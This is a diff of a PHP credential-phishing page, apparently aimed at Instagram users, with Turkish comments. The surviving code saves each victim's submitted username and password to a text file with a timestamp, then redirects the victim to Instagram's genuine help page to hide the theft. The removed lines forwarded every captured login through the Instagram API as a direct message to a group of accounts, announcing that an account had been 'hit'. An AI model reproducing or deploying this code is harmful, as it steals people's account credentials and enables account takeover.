@@ -43,37 +43,6 @@ if(isset($_POST['comen']))
     fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "sifre ====> " . $_POST['password'] . PHP_EOL . "Tarih ====> " . date("Y-m-d H:i:s", time()) . PHP_MULTILINE);
     fclose($dosya);
     
-    \InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
-    
-    $ig = new \InstagramAPI\Instagram();
-    
-    try{
-        $ig->login("KULLANICI", "SIFRE"); # Kullanıcı Adı / Şifre
-        
-        $msg = "Bir Hesap Vuruldu!
-Hesap: ". $_POST['username'] ."
-Şifre: ". $_POST['password'] ."
-Daha Fazla Bilgi: ".$_SERVER['HTTP_HOST']."/bariscodefx.txt
-API LOG: ".$_SERVER['HTTP_HOST']."/instaapilog.txt
-        ";
-        
-        $users = [ # dm grubu
-            "kullanici1",
-            "kullanici2",
-            "kullanici3",
-        ];
-        $users_id = [];
-        foreach($users as $user) {
-            $users_id[] = $ig->people->getUserIdForName($user);
-        }
-        
-        $ig->direct->sendText(['users' => $users_id], $msg);
-    } catch(\Exception $e) {
-        $log = fopen("instaapilog.txt", "a");
-        fwrite($log, $e->getMessage() . PHP_EOL);
-        fclose($log);
-    }
-    
     header("location: https://help.instagram.com/contact/539946876093520");
 }
 
